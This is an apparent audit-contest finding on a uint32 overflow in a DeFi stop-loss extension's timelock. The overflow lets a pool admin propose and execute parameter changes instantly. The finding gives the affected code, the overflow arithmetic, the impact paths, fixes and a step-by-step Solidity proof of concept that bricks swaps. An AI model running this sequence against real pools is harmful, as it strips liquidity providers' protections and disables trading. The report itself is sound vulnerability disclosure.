### Title
`OracleValueStopLossExtension._afterTimelock` uint32 Overflow Lets Pool Admin Bypass LP-Protective Timelock Instantly — (`metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol`)

---

### Summary

`OracleValueStopLossExtension` uses a `uint32` timelock to protect LPs from sudden parameter changes by the pool admin. The helper `_afterTimelock` computes `uint32(block.timestamp + timelock)`. When the pool admin sets `timelock = type(uint32).max`, the addition overflows the `uint32` cast and wraps to a timestamp already in the past, so every subsequent proposal passes `_requireElapsed` immediately. The pool admin can then atomically propose and execute any drawdown, decay, or watermark change with zero delay, defeating the only LP-facing governance guard on this extension.

---

### Finding Description

`_afterTimelock` is the single function that computes the "execute-after" timestamp for every timelocked action in the extension:

```solidity
// metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol
function _afterTimelock(address pool_) private view returns (uint32) {
    return uint32(block.timestamp + oracleStopLossConfig[pool_].timelock);
}
```

`oracleStopLossConfig[pool_].timelock` is `uint32`. The addition is performed in `uint256` (implicit promotion), then truncated to `uint32`. At the current epoch (~1.75 × 10⁹):

```
block.timestamp + type(uint32).max
= 1_753_000_000 + 4_294_967_295
= 6_047_967_295
uint32(6_047_967_295) = 6_047_967_295 mod 4_294_967_296 ≈ 1_752_999_999
```

The result is approximately `block.timestamp − 1`, a timestamp already elapsed. `_requireElapsed` therefore passes immediately for every proposal.

The pool admin reaches this state via `proposeOracleStopLossTimelock` / `executeOracleStopLossTimelock`, neither of which validates the new timelock value:

```solidity
function proposeOracleStopLossTimelock(address pool_, uint32 newTimelock) external onlyPoolAdmin(pool_) {
    PoolStopLossSchedule storage sched = _initializedSchedule(pool_);
    uint32 executeAfter = _afterTimelock(pool_);   // uses CURRENT timelock
    sched.pendingTimelock = newTimelock;            // no cap on newTimelock
    sched.pendingTimelockExecuteAfter = executeAfter;
    ...
}
```

Likewise, `initialize` accepts any `uint32 timelock` without validation:

```solidity
(uint32 drawdownE6, uint32 decayPerSecondE8, uint32 timelock) = abi.decode(data, (uint32, uint32, uint32));
_validateDrawdown(drawdownE6);
_validateDecay(decayPerSecondE8);
// timelock is stored without any upper-bound check
```

---

### Impact Explanation

Once the pool admin has set `timelock = type(uint32).max`, every subsequent call to `proposeOracleStopLoss{Timelock,Drawdown,Decay,HighWatermarks}` produces an `executeAfter` that is already in the past. The admin can call propose and execute in the same block (or even the same transaction via a helper contract), with zero LP reaction time.

Concrete harm paths:

1. **Permanent swap DoS**: Admin immediately sets per-bin watermarks to `type(uint104).max`. On the next swap, `_checkAndUpdateWatermarks` finds `metric < hwm * floorMultiplier / E6` and reverts with `OracleStopLossTriggered`. Because watermarks can only be lowered through the same timelocked path (now also bypassable), the pool's swap function is permanently bricked for any direction the admin chooses.

2. **Silent removal of LP protection**: Admin immediately sets `drawdownE6 = 0`, which causes `_afterSwapOracleStopLoss` to return early (`if (drawdown == 0) return`), silently disabling all stop-loss checks. LPs who deposited expecting stop-loss protection receive none.

Both outcomes match the allowed impact gate: "Broken core pool functionality causing loss of funds or unusable withdraw/swap/liquidity flows" and "Admin-boundary break: pool admin exceeds caps, bypasses timelocks."

---

### Likelihood Explanation

- The pool admin is explicitly classified as **semi-trusted** in the contest scope.
- The attack requires only two transactions (propose + execute) after the current timelock elapses, or a single block if the initial timelock is 0.
- `initialize` does not cap the initial timelock, so a pool can be deployed with `timelock = type(uint32).max` from day one, making the bypass available immediately.
- No special privileges beyond `onlyPoolAdmin` are required.

---

### Recommendation

1. Add an upper-bound constant and enforce it in both `initialize` and `proposeOracleStopLossTimelock`:

```solidity
uint32 private constant MAX_TIMELOCK = 30 days; // example

function proposeOracleStopLossTimelock(address pool_, uint32 newTimelock) external onlyPoolAdmin(pool_) {
    if (newTimelock > MAX_TIMELOCK) revert OracleStopLossTimelockTooLarge(newTimelock);
    ...
}
```

2. Alternatively, perform the addition in `uint256` and compare before casting:

```solidity
function _afterTimelock(address pool_) private view returns (uint32) {
    uint256 result = block.timestamp + oracleStopLossConfig[pool_].timelock;
    require(result <= type(uint32).max, "timelock overflow");
    return uint32(result);
}
```

---

### Proof of Concept

```solidity
// Assume pool was created with OracleValueStopLossExtension, initial timelock = 0.

// Step 1: propose timelock = type(uint32).max
// _afterTimelock returns uint32(block.timestamp + 0) = block.timestamp (no overflow yet)
extension.proposeOracleStopLossTimelock(pool, type(uint32).max);

// Step 2: execute immediately (executeAfter == block.timestamp, _requireElapsed passes)
extension.executeOracleStopLossTimelock(pool);
// oracleStopLossConfig[pool].timelock is now type(uint32).max

// Step 3: propose watermarks = type(uint104).max for bin 0
// _afterTimelock: uint32(block.timestamp + type(uint32).max) wraps to ~block.timestamp - 1
extension.proposeOracleStopLossHighWatermarks(pool, 0, type(uint104).max, type(uint104).max);

// Step 4: execute immediately (executeAfter is already in the past)
extension.executeOracleStopLossHighWatermarks(pool);

// Step 5: any swap on bin 0 now reverts with OracleStopLossTriggered
pool.swap(...); // reverts — pool is bricked for swaps
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L56-62)
```text
    (uint32 drawdownE6, uint32 decayPerSecondE8, uint32 timelock) = abi.decode(data, (uint32, uint32, uint32));
    _validateDrawdown(drawdownE6);
    _validateDecay(decayPerSecondE8);

    oracleStopLossConfig[pool] = PoolStopLossConfig({
      drawdownE6: drawdownE6, decayPerSecondE8: decayPerSecondE8, timelock: timelock, initialized: true
    });
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L78-84)
```text
  function proposeOracleStopLossTimelock(address pool_, uint32 newTimelock) external onlyPoolAdmin(pool_) {
    PoolStopLossSchedule storage sched = _initializedSchedule(pool_);
    uint32 executeAfter = _afterTimelock(pool_);
    sched.pendingTimelock = newTimelock;
    sched.pendingTimelockExecuteAfter = executeAfter;
    emit OracleStopLossTimelockProposed(pool_, newTimelock, executeAfter);
  }
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L86-94)
```text
  function executeOracleStopLossTimelock(address pool_) external onlyPoolAdmin(pool_) {
    PoolStopLossSchedule storage sched = _initializedSchedule(pool_);
    if (sched.pendingTimelockExecuteAfter == 0) revert OracleStopLossNoPendingTimelock(pool_);
    _requireElapsed(sched.pendingTimelockExecuteAfter);
    uint32 timelock = sched.pendingTimelock;
    oracleStopLossConfig[pool_].timelock = timelock;
    (sched.pendingTimelock, sched.pendingTimelockExecuteAfter) = (0, 0);
    emit OracleStopLossTimelockSet(pool_, timelock);
  }
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L157-166)
```text
  function proposeOracleStopLossHighWatermarks(address pool_, int8 binIdx, uint104 newHwmToken0, uint104 newHwmToken1)
    external
    onlyPoolAdmin(pool_)
  {
    _requireInitialized(pool_);
    uint32 executeAfter = _afterTimelock(pool_);
    pendingHighWatermark[pool_] =
      PendingHighWatermarks({token0: newHwmToken0, token1: newHwmToken1, binIdx: binIdx, executeAfter: executeAfter});
    emit OracleStopLossHighWatermarkProposed(pool_, binIdx, newHwmToken0, newHwmToken1, executeAfter);
  }
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L169-177)
```text
  function executeOracleStopLossHighWatermarks(address pool_) external onlyPoolAdmin(pool_) {
    PendingHighWatermarks memory pending = pendingHighWatermark[pool_];
    if (pending.executeAfter == 0) revert OracleStopLossNoPendingHighWatermark(pool_);
    _requireElapsed(pending.executeAfter);
    highWatermarks[pool_][pending.binIdx] =
      BinHighWatermarks({token0: pending.token0, token1: pending.token1, lastDecayTs: uint32(block.timestamp)});
    delete pendingHighWatermark[pool_];
    emit OracleStopLossHighWatermarkUpdated(pool_, pending.binIdx, pending.token0, pending.token1);
  }
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L297-299)
```text
  function _afterTimelock(address pool_) private view returns (uint32) {
    return uint32(block.timestamp + oracleStopLossConfig[pool_].timelock);
  }
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L301-303)
```text
  function _requireElapsed(uint32 executeAfter) private view {
    if (block.timestamp < executeAfter) revert OracleStopLossTimelockNotElapsed(executeAfter, block.timestamp);
  }
```
